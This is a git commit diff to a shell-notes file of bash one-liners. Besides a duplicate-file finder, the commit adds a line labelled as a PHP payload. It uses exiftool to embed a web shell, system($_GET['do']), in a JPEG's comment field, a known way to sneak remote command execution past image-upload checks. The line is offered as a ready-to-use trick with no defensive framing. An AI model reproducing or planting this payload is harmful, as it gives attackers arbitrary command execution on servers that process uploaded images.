4791fbe5d14da271eb5213ec8181319834500bef
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-03-09 18:07:17 -0300

    Update bash_tricks.sh

--- Code/Bash/bash_tricks.sh
+++ Code/Bash/bash_tricks.sh
@@ -46,3 +46,6 @@ du -sh *
 
 # Check for duplicates with md5sum and file size:
 find -not -empty -type f -printf "%s\n" | sort -rn | uniq -d | xargs -I{} -n1 find -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate
+
+# Insert PHP payload with exiftool:
+exiftool -Comment='<?php system($_GET['do']); ?>' img.jpg
